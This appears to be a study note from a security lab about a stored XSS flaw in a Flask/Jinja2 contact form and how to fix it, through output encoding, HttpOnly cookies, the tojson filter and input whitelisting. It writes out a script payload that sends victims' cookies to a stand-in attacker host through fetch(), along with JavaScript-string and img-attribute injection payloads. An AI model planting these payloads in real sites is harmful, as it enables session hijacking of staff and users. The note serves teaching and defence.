# Why the Contact Form is vulnerable: 
---

- to understand why the contact form is vulnerable, we have to understand that the values we put into the contact form are stored in a database and gets displayed on the `staff.html` page 
- The contact form is vulnerable because user input is rendered without output encoding in `staff.html`:
```html
{% for msg in messages %}

<div class="container">
	<div class="name">
		<p>{{msg.name | safe}}</p>
	</div>
	<div class="email">
		<p>{{msg.email | safe}}</p>
	</div>
	<div class="message">
		<p>{{msg.message | safe}}</p>
	</div>
</div>

{% endfor %}
```

- the `safe` filter disables Jinja2’s automatic output encoding, causing user input to be rendered as raw HTML
- so the vulnerability is not caused by storing user input in the database, but by rendering it without proper output encoding
- but this means that an attacker could input JavaScript code into one of the contact form fields and steal cookies
- this method is also called: `Stored XSS`

- so an attacker could use this payload:
```html
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script> 
```

- after the attacker has sent the payload he has to wait for staff member for example to view the page where the messages are being displayed 
- because then we script would instantly execute the `fetch()` function, which sends a request to the attacker’s server, including the victim’s cookies

# How to make the Contact Form secure: 
---

- to make the contact form secure we have to remove the `safe` filter, like this: 
```html
{% for msg in messages %}

<div class="container">
	<div class="name">
		<p>{{msg.name}}</p>
	</div>
	<div class="email">
		<p>{{msg.email}}</p>
	</div>
	<div class="message">
		<p>{{msg.message}}</p>
	</div>
</div>

{% endfor %}
```

- because `jinja2`, the template engine, used by `Flask` does output encoding by default 
- output encoding converts specific symbols: 
```
& -> &amp; 
< -> &lt; 
> -> &gt; 
" -> &quot; 
' -> &#x27;
```

- so that they are not seen as code, rather text
- so this payload: 
```html
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script> 
```

- would transform to this: 
```html
&lt;script&gt;fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));&lt;/script&gt;
```

- to add one more security measurement we can add `HTTPOnly` to the cookie settings
- `HTTPOnly` gets explained in the explanation on `Why the cookies are unsecure`  

# ⚠️ Important note:

- If user input is inserted directly into JavaScript, **HTML output encoding is not sufficient**
- `example`: 
``` html
<script>  
var data = "{{ user_input }}";  
</script>
```

- an attacker could use the following payload
```html
"; alert(1); //
```


- the attacker breaks out of the JavaScript string context and you would see the alert box 
- To prevent this, use the `tojson` filter from Jinja2:
```html
<script>  
var data = {{ user_input | tojson }};  
</script>
```

- another problem can be if you use image tags: 
```html
<img src="{{ user_input }}">
```

- In this context, an attacker can inject additional attributes, such as event handlers:
```html
x" onerror="alert(1)
```

- user input should be validated against a whitelist of allowed value